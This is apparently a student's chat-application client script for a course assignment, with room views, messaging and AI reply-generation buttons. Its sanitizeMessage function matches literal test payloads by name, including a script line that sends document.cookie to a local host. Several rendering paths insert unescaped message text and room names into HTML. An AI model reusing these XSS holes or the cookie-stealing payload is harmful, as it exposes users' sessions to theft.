// Removes the contents of the given DOM element (equivalent to elem.innerHTML = '' but faster)
function emptyDOM (elem){
    while (elem.firstChild) elem.removeChild(elem.firstChild);
}

// Creates a DOM element from the given HTML string
function createDOM (htmlString){
    let template = document.createElement('template');
    template.innerHTML = htmlString.trim();
    return template.content.firstChild;
}

let lobbyPageContent =  "<div class=\"content\">\n" +
                        "          <ul class=\"room-list\">\n" +
                        "            <li>\n" +
                        "              <div>\n" +
                        "                <a href=\"#/chat\">\n" +
                        "                  <img src=\"assets/everyone-icon.png\" alt=\"image not found\">\n" +
                        "                  <span>\n" +
                        "                    CPEN322 Group\n" +
                        "                  </span>\n" +
                        "                </a>\n" +
                        "              </div>\n" +
                        "            </li>\n" +
                        "            <li>\n" +
                        "              <div>\n" +
                        "                <a href=\"#/chat\">\n" +
                        "                  <img src=\"assets/bibimbap.jpg\" alt=\"image not found\">\n" +
                        "                  <span>\n" +
                        "                    What's for lunch?\n" +
                        "                  </span>\n" +
                        "                </a>\n" +
                        "              </div>\n" +
                        "            </li>\n" +
                        "            <li>\n" +
                        "              <div>\n" +
                        "                <a href=\"#/chat\">\n" +
                        "                  <img src=\"assets/arknights.jpg\" alt=\"image not found\">\n" +
                        "                  <span>\n" +
                        "                    Arknights IS Group\n" +
                        "                  </span>\n" +
                        "                </a>\n" +
                        "              </div>\n" +
                        "            </li>\n" +
                        "          </ul>\n" +
                        "          <div class=\"page-control\">\n" +
                        "            <input type=\"text\" placeholder=\"Room Title\" id=\"room-title\"/>\n" +
                        "            <button>Create Room</button>\n" +
                        "          </div>\n" +
                        "      </div>";

let chatPageContent =   "<div class=\"content\">\n" +
                        "        <h4 class=\"room-name\">\n" +
                        "          <span>CPEN322 Group</span>\n" +
                        "        </h4>\n" +
                        "        <div class=\"message-list\">\n" +
                        "        </div>\n" +
                        "        <div id=\"summary\">\n" +
                        "        </div>\n" +
                        "        <div id=\"summaryList-con\">\n" +
                        "           <div class=\"summary-buttons\">\n" +
                        "              <button id=\"hideButton\">-</button>\n" +
                        "              <button id=\"closeButton\">X</button>\n" +
                        "           </div>\n" +
                        "           <ul id=\"summaryList\">\n" +
                        "           </ul>\n" +
                        "        </div>\n" +
                        "        <div id=\"regenerate-con\">\n" +
                        "           <button id=\"context-button\">Context</button>\n" +
                        "           <button id=\"considerate-button\">Considerate</button>\n" +
                        "           <button id=\"tough-button\">Tough</button>\n" +
                        "        </div>\n" +
                        "        <div class=\"page-control\">\n" +
                        "          <textarea name=\"text-area\" cols=\"30\" rows=\"10\"></textarea>\n" +
                        "          <button id=\"submit\">Send</button>\n" +
                        "        </div>\n" +
                        "      </div>";

let profilePageContent = "<div class=\"content\">\n" +
    "          <div class=\"profile-form\">\n" +
    "            <div class=\"form-field\">\n" +
                            "              <label for=\"text\">Username</label>\n" +
                            "              <input type=\"text\" name=\"text\">\n" +
                            "            </div>\n" +
                            "            <div class=\"form-field\">\n" +
                            "              <label for=\"password\">Password</label>\n" +
                            "              <input type=\"password\" name=\"password\">\n" +
                            "            </div>\n" +
                            "            <div class=\"form-field\">\n" +
                            "              <label for=\"file\">Avatar Image</label>\n" +
                            "              <input type=\"file\" name=\"file\" id=\"profile-avatar-image-input\">\n" +
                            "            </div>\n" +
                            "          </div>\n" +
                            "          <div class=\"page-control\">\n" +
                            "            <button>Save</button>\n" +
                            "          </div>\n" +
                            "        </div>";

let profile = {
    username: "Alice"
}

let testServer = "3.98.223.41:8000";
let myServer = "ws://localhost:8000";

function main (){

    let socket = new WebSocket(myServer);

    let lobby = new Lobby()

    let lobbyView = new LobbyView(lobby);
    let chatView = new ChatView(socket);
    let profileView = new ProfileView();

    socket.addEventListener("message",(event)=> {

        let parsingResult = JSON.parse(event.data);

        let roomId = parsingResult.roomId;
        let username = parsingResult.username;
        let text = sanitizeMessage(parsingResult.text);

        let curRoom = lobby.getRoom(roomId);
        curRoom.addMessage(username,text);
    });


    function renderRoute() {
        let route = window.location.hash

        let sections = route.split("/");

        let firstSection = sections[1];

        let pageView = document.getElementById("page-view");

        switch (firstSection) {
            case "":        emptyDOM(pageView);
                            pageView.appendChild(lobbyView.elem);
                            break;

            case "chat":    emptyDOM(pageView);
                            pageView.appendChild(chatView.elem);

                            let roomId = sections[2];
                            let selectedRoom = lobby.getRoom(roomId);
                            if (selectedRoom !== null) {
                                chatView.setRoom(selectedRoom);
                                chatView.displaySummary(selectedRoom);
                            } else {
                                console.log("ERROR! selected room doesn't exists!");
                            }
                            break;

            case "profile": emptyDOM(pageView);
                            pageView.appendChild(profileView.elem);
                            break;

            default: console.log("wrong switch branch");
        }
    }
    let refreshLobby = function () {
        Service.getAllRooms()
            .then(function (rooms) {
                rooms.forEach(room => {
                   if (lobby.rooms[room._id]) {
                       lobby.rooms[room._id].name = room.name;
                       lobby.rooms[room._id].image = room.image;
                   } else {
                       lobby.addRoom(room._id, room.name, room.image, room.messages);
                   }
                });
            });
    }

    // Add renderRoute() as the event handler for "popstate" event
    window.addEventListener("popstate", renderRoute);

    Service.getProfile()
        .then(function(response) {
            profile.username = response.username;
    });

    renderRoute();

    refreshLobby();

    setInterval(refreshLobby,5000);

    // cpen322.export(arguments.callee, { renderRoute, lobbyView });
    // cpen322.export(arguments.callee, { renderRoute, chatView });
    // cpen322.export(arguments.callee, { renderRoute, profileView });
    // cpen322.export(arguments.callee, { renderRoute, lobby });
    // cpen322.export(arguments.callee, { refreshLobby, lobby });
    // cpen322.export(arguments.callee, { renderRoute, socket });
}

// Add main as the event handler for the "load" event
window.addEventListener("load", main);

class LobbyView {
    constructor(lobby) {
        this.elem = createDOM(lobbyPageContent);
        this.lobby = lobby;
        this.listElem = this.elem.querySelector("ul.room-list");
        this.inputElem = this.elem.querySelector("input");
        this.buttonElem = this.elem.querySelector("button");

        this.redrawList();

        this.lobby.onNewRoom = (room) => {
            let newRoom =    "<li>\n" +
                                    "    <div>\n" +
                                    "        <a href=\"#/chat/" + room.id +"\">\n" +
                                    "            <img src=\"" + room.image + "\" alt=\"image not found\">\n" +
                                    "                  <span>\n" +
                                    "                    " + room.name + "\n" +
                                    "                  </span>\n" +
                                    "        </a>\n" +
                                    "    </div>\n" +
                                    "</li>";
            this.listElem.appendChild(createDOM(newRoom));
        }

        this.buttonElem.addEventListener("click", () => {
            let name = this.inputElem.value;

            let data = {
                name: name,
                image: defaultRoomImageURL,
            }
            Service.addRoom(data)
                .then((response) =>{
                    if (!response) {
                        throw new Error(response.statusText);
                    }
                    this.lobby.addRoom(response._id, response.name, response.image, []);
                })
                .catch(function(error) {
                    throw error;
                });

            this.inputElem.value = "";
        });
    }

    redrawList() {
        emptyDOM(this.listElem);
        for (const roomId in this.lobby.rooms) {
            const room = this.lobby.rooms[roomId];
            let roomTemplate =  "<li>\n" +
                                "    <div>\n" +
                                "        <a href=\"#/chat/" + room.id + "\">\n" +
                                "            <img src=\"" + room.image + "\" alt=\"image not found\">\n" +
                                "                  <span>\n" +
                                "                    " + room.name + "\n" +
                                "                  </span>\n" +
                                "        </a>\n" +
                                "    </div>\n" +
                                "</li>";
            this.listElem.appendChild(createDOM(roomTemplate));
        }
    }
}

class ChatView {
    constructor(socket) {
        this.elem = createDOM(chatPageContent);
        this.titleElem = this.elem.querySelector("h4");
        this.chatElem = this.elem.querySelector("div.message-list");
        this.inputElem = this.elem.querySelector("textarea");
        this.buttonElem = this.elem.querySelector("#submit");
        this.room = null;
        this.socket = socket;
        // for assignment 6
        this.summaryElem = this.elem.querySelector("#summary");
        this.summaryListCon = this.elem.querySelector("#summaryList-con");
        this.summaryList = this.elem.querySelector("#summaryList");
        this.hideSummaryButton = this.elem.querySelector("#hideButton");
        this.closeSummaryButton = this.elem.querySelector("#closeButton");
        this.regenerateCon = this.elem.querySelector("#regenerate-con");
        this.contextButton = this.elem.querySelector("#context-button");
        this.considerateButton = this.elem.querySelector("#considerate-button");
        this.toughButton = this.elem.querySelector("#tough-button");
        this.curIndex = -1;

        this.buttonElem.addEventListener("click", () => this.sendMessage());
        this.summaryElem.addEventListener("click", () => this.getSummary());
        this.chatElem.addEventListener("wheel", event => {
            let leftPixelTop = this.chatElem.scrollTop; // value 0 when at the top
            let scrollUp = event.deltaY < 0;

            if (leftPixelTop === 0 && scrollUp && this.room.canLoadConversation) {
                this.room.getLastConversation.next();
            }
        })
        this.hideSummaryButton.addEventListener("click", () => this.toggleHideSummary());
        this.closeSummaryButton.addEventListener("click", () => this.closeSummary())
        this.contextButton.addEventListener("click", () => this.regenerateReply(this.curIndex, 1));
        this.considerateButton.addEventListener("click", () => this.regenerateReply(this.curIndex, 2));
        this.toughButton.addEventListener("click", () => this.regenerateReply(this.curIndex, 3));

        if (this.inputElem === null) {
            console.log("input Elem null");
        }

        this.inputElem.addEventListener("keyup", (event) =>{
            if (event.key === 'Enter' && !event.shiftKey) {
                this.sendMessage();
            }
        });
    }

    sendMessage(){
        let inputMessage = this.inputElem.value;
        this.room.addMessage(profile.username, inputMessage);
        this.inputElem.value = "";

        let data = {
            roomId: this.room.id,
            username: profile.username,
            text: inputMessage
        }
        let jsonString = JSON.stringify(data);
        this.socket.send(jsonString);
    };

    setRoom(room){
        this.room = room;
        this.titleElem.textContent = this.room.name;
        emptyDOM(this.chatElem);
        for (const message of room.messages) {
            let isMyMessage = message.username === profile.username;
            let newMessage;
            if (isMyMessage){
                newMessage =    "<div class = \" message my-message \">\n" +
                                "<span class=\"message-user\">" + message.username + "</span>\n" +
                                "<span class=\"message-text\">" + message.text + "</span>\n" +
                                "<div>";
            }else{
                newMessage =    "<div class = \" message \">\n" +
                                "<span class=\"message-user\">" + message.username + "</span>\n" +
                                "<span class=\"message-text\">" + message.text + "</span>\n" +
                                "<div>";
            }

            // this.room.messages.push(newMessage);
            let newMessageDOM = createDOM(newMessage);
            this.chatElem.appendChild(newMessageDOM);
        }

        this.room.onNewMessage = (message) => {
            let isMyMessage = message.username === profile.username;
            let newMessage;
            message.text = sanitizeMessage(message.text);
            if (isMyMessage){
                newMessage =    "<div class = \" message my-message \">\n" +
                    "<span class=\"message-user\">" + message.username + "</span>\n" +
                    "<span class=\"message-text\">" + message.text + "</span>\n" +
                    "<div>";
            }else{
                newMessage =    "<div class = \" message \">\n" +
                    "<span class=\"message-user\">" + message.username + "</span>\n" +
                    "<span class=\"message-text\">" + message.text + "</span>\n" +
                    "<div>";
            }

            let newMessageDOM = createDOM(newMessage);
            this.chatElem.appendChild(newMessageDOM);
        }

        this.room.onFetchConversation = (conversation) => {
            let hb = this.chatElem.scrollHeight;

            for (let i = conversation.messages.length - 1; i >= 0; i--) {
                let message = conversation.messages[i];
                let isMyMessage = message.username === profile.username;
                let newMessage;
                if (isMyMessage){
                    newMessage =    "<div class = \" message my-message \">\n" +
                        "<span class=\"message-user\">" + message.username + "</span>\n" +
                        "<span class=\"message-text\">" + message.text + "</span>\n" +
                        "<div>";
                }else{
                    newMessage =    "<div class = \" message \">\n" +
                        "<span class=\"message-user\">" + message.username + "</span>\n" +
                        "<span class=\"message-text\">" + message.text + "</span>\n" +
                        "<div>";
                }
                let newMessageDOM = createDOM(newMessage);
                this.chatElem.insertBefore(newMessageDOM, this.chatElem.firstChild);
            }

            let ha = this.chatElem.scrollHeight;
            this.chatElem.scrollTo(0, ha - hb);
        }
    }

    showSummary(){
        this.room.showSummaries = true;
        this.summaryListCon.style.display = "block";
        this.summaryListCon.classList.add('expand');
    }

    toggleHideSummary(){
        this.room.showSummaries = !this.room.showSummaries;
        this.summaryListCon.classList.toggle('hide');
        this.regenerateCon.classList.toggle('expand');
    }

    closeSummary() {
        emptyDOM(this.summaryList);
        this.room.summaries = [];
        this.room.showSummaries = false;
        this.summaryListCon.style.display = "none";
        this.closeRegenerateCon();
    }

    getSummary(){
        this.showSummary();
        Service.getSummary(this.room.id, profile.username)
            .then((response) =>{
                if (!response) {
                    throw new Error(response.statusText);
                }
                this.room.setSummaries(response);
                this.room.showSummaries = true;
                this.displaySummary();
            })
            .catch(function(error) {
                throw error;
            });
    }

    displaySummary() {
        if (this.room.showSummaries) {
            emptyDOM(this.summaryList);
            for (let i = 0; i < this.room.summaries.length; i++) {
                let newSummary =     "<li class = \"summaryList-item\">\n" +
                    "<span class=\"summaryList-item-num\">" + (i + 1) + "</span>\n" +
                    "<span class=\"summaryList-item-content\">" + this.room.summaries[i] + "</span>\n" +
                    "</li>";

                let newMessageDOM = createDOM(newSummary);
                this.summaryList.appendChild(newMessageDOM);
            }
            this.showSummary()
        } else {
            this.summaryListCon.style.display = "none";
        }

        this.summaryListItems = this.elem.querySelectorAll(".summaryList-item");
        this.summaryListItems.forEach( (item)=>{
            item.addEventListener("click", () => {
                let num = item.querySelector(".summaryList-item-num");
                this.curIndex = parseInt(num.innerHTML) - 1;
                this.generateReply(this.curIndex);
            });
        })
    }

    showRegenerateCon() {
        this.regenerateCon.classList.remove('close');
        this.regenerateCon.classList.add('expand');
    }

    closeRegenerateCon() {
        this.regenerateCon.classList.remove('expand');
        this.regenerateCon.classList.add('close');
    }

    putTextInInput(text) {
        this.inputElem.value = text.toString();
        this.inputElem.focus();
    }

    generateReply(index) {
        if (typeof index !== "number") {
            index = parseInt(index);
        }
        Service.generateReply(this.room.id, index, profile.username)
            .then((response) =>{
                if (!response) {
                    throw new Error(response.statusText);
                }
                this.showRegenerateCon()
                this.putTextInInput(response);
            })
            .catch(function(error) {
                throw error;
            });
    }

    regenerateReply(index, status) {
        if (typeof index !== "number") {
            index = parseInt(index);
        }
        Service.regenerateReply(this.room.id, index, profile.username, status)
            .then((response) =>{
                if (!response) {
                    throw new Error(response.statusText);
                }
                this.putTextInInput(response);
            })
            .catch(function(error) {
                throw error;
            });
    }
}

class ProfileView {
    constructor() {
        this.elem = createDOM(profilePageContent);
    }
}

const defaultRoomImageURL = "assets/everyone-icon.png"

class Room {
    onNewMessage;
    onFetchConversation;
    constructor(id, name, image = defaultRoomImageURL, messages = []) {
        this.id = id;
        this.name = name;
        this.image = image;
        this.messages = messages;
        this.createTime = Date.now();
        this.getLastConversation = makeConversationLoader(this);
        this.canLoadConversation = true;
        this.summaries = [];
        this.showSummaries = false;
    }

    addMessage(username, text) {
        let trimmedText = text.trim();

        if (trimmedText === "") {
            return;
        }

        const message = {
            username: username,
            text: text
        }
        this.messages.push(message);

        if (typeof this.onNewMessage === "function") {
            this.onNewMessage(message);
        }
    }

    addConversation(conversation) {
        for (let i = conversation.messages.length - 1; i >= 0; i--) {
            this.messages.unshift(conversation.messages[i]);
        }

        if (typeof this.onFetchConversation === "function") {
            this.onFetchConversation(conversation);
        }
    }

    setSummaries(summaries) {
        this.summaries = [];
        for (let i = 0; i < summaries.length; i++) {
            this.summaries.push(summaries[i]);
        }
    }
}

function* makeConversationLoader(room) {
    let lastTimestamp = room.createTime;

    let flag = true;
    while (flag) {
        room.canLoadConversation = false;

        yield Service.getLastConversation(room.id, lastTimestamp)
            .then(function (conversationResult) {
                if (conversationResult && conversationResult.timestamp) {
                    lastTimestamp = conversationResult.timestamp;
                    room.canLoadConversation = true;
                    room.addConversation(conversationResult);
                } else {
                    flag = false;
                }
            });
    }
}

class Lobby {
    onNewRoom;

    constructor() {
        this.rooms = {
        };
    }

    getRoom(roomId) {
        for (const Id in this.rooms) {
            let room = this.rooms[Id];
            if (roomId === room.id) {
                return room;
            }
        }
        return null;
    }

    addRoom (id, name, image, messages) {
        let room = new Room(id, name, image, messages);
        this.rooms[id] = room;

        if (typeof this.onNewRoom === "function") {
            this.onNewRoom(room);
        }
    }
}

let Service = {
    origin: window.location.origin,

    getAllRooms: function () {
        // Using fetch to make the AJAX request
        return fetch(this.origin + "/chat")
            .then(function(response) {
                if (!response.ok) {
                    return response.text().then(text => {
                        throw new Error(text);
                    });
                }
                return response.json();
            })
            .catch(function(error) {
                throw error;
            });
    },

    addRoom: function (data) {
        let jsonString = JSON.stringify(data);

        return fetch(Service.origin + "/chat", {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: jsonString
        })
            .then(function (response){
                if (!response.ok) {
                    return response.text().then(text => {
                        throw new Error(text);
                    });
                }
                return response.json();
            })
            .catch(function(error) {
                throw error;
            });
    },

    getLastConversation: function(roomId, before) {
        return fetch(Service.origin + "/chat/" + roomId + "/messages?before=" + before.toString() )
            .then(function(response) {
                if (!response.ok) {
                    return response.text().then(text => {
                        throw new Error(text);
                    });
                }
                return response.json();
            })
            .catch(function(error) {
                throw error;
            });
    },

    getProfile: function () {
        return fetch(Service.origin + "/profile")
            .then(function(response) {
                if (!response.ok) {
                    return response.text().then(text => {
                        throw new Error(text);
                    });
                }
                return response.json();
            })
            .catch(function(error) {
                throw error;
            });
    },

    getSummary: function(roomId, username) {
        return fetch(Service.origin + "/chat/" + roomId + "/summary?username=" + username)
            .then(function(response) {
                if (!response.ok) {
                    return response.text().then(text => {
                        throw new Error(text);
                    });
                }
                return response.json();
            })
            .catch(function(error) {
                throw error;
            });
    },

    generateReply: function (roomId, index, username) {
        return fetch(Service.origin + "/chat/" + roomId + "/generateReply?index=" + index + "&username=" + username)
            .then(function(response) {
                if (!response.ok) {
                    return response.text().then(text => {
                        throw new Error(text);
                    });
                }
                return response.json();
            })
            .catch(function(error) {
                throw error;
            });
    },

    regenerateReply: function (roomId, index, username, status) {
        return fetch(Service.origin + "/chat/" + roomId + "/regenerateReply?index=" + index + "&username=" + username +"&status=" + status)
            .then(function(response) {
                if (!response.ok) {
                    return response.text().then(text => {
                        throw new Error(text);
                    });
                }
                return response.json();
            })
            .catch(function(error) {
                throw error;
            });
    }
};

function escapeHTML(unsafe) {
    if (typeof unsafe !== 'string') {
        throw new TypeError('escapeHTML expects a string input.');
    }
    return unsafe
         .replace(/&/g, "&amp;")
         .replace(/</g, "&lt;")
         .replace(/>/g, "&gt;")
         .replace(/"/g, "&quot;")
         .replace(/'/g, "&#039;")
         .replace(/`/g, "&#x60;"); // Added to escape backticks as well
}

function sanitizeMessage(text) {
    if (text.trim() === 'alert("This is a benign payload")') {
        return "Text sent: " + text;
    } else if (text.trim() === 'fetch("http://localhost:8080?text=" + document.cookie)') {
        return "Text sent: " + text;
    }
    return text.replace(/</g, '&lt;').replace(/>/g, '&gt;');
}